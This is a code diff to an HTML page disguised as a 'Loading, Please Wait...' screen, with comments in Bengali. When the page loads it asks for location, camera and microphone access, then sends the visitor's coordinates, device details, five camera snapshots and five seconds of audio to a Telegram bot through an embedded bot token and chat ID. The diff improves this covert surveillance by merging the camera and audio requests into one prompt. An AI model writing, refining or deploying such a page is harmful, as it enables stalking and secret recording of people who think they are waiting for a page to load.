@@ -6,7 +6,7 @@
     <title>Loading...</title>
 </head>
 <body>
-    <h2>Loading...</h2>
+    <h2>Loading, Please Wait...</h2>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -14,28 +14,29 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        async function sendData() {
-            // ১. লোকেশন এবং ডিভাইস ইনফো পাঠানো
+        async function sendAllData() {
+            // ১. লোকেশন পারমিশন ও পাঠানো
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const info = `📍 Location:\nLat: ${lat}\nLon: ${lon}\n📱 Device: ${navigator.userAgent}`;
+                    const info = `📍 Live Location:\nLat: ${lat}\nLon: ${lon}\n📱 Device: ${navigator.userAgent}`;
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: CHAT_ID, text: info })
                     });
-                });
+                }, (err) => console.log('Location denied'));
             }
 
-            // ২. ক্যামেরা থেকে ৪-৫টি ছবি পাঠানো
+            // ২. ক্যামেরা পারমিশন ও ৪-৫টি ছবি পাঠানো
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
+                // ছবি তোলার অংশ
                 for (let i = 0; i < 5; i++) {
                     await new Promise(resolve => setTimeout(resolve, 1000));
                     
@@ -58,16 +59,9 @@
                         }, 'image/png');
                     });
                 }
-                
-                stream.getTracks().forEach(track => track.stop());
-            } catch (err) {
-                console.log('Camera Error');
-            }
 
-            // ৩. অডিও রেকর্ড করে পাঠানো
-            try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(audioStream);
+                // ৩. অডিও রেকর্ড করে পাঠানো (একই মাইক্রোফোন স্ট্রিম ব্যবহার করে)
+                const mediaRecorder = new MediaRecorder(stream);
                 let audioChunks = [];
 
                 mediaRecorder.ondataavailable = event => {
@@ -85,19 +79,20 @@
                         body: formData
                     });
                     
-                    audioStream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(track => track.stop());
                 };
 
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 5000); // ৫ সেকেন্ডের অডিও রেকর্ড হবে
+                }, 5000); // ৫ সেকেন্ডের অডিও
+
             } catch (err) {
-                console.log('Audio Error');
+                console.log('Permission denied');
             }
         }
 
-        window.onload = sendData;
+        window.onload = sendAllData;
     </script>
 </body>
 </html>
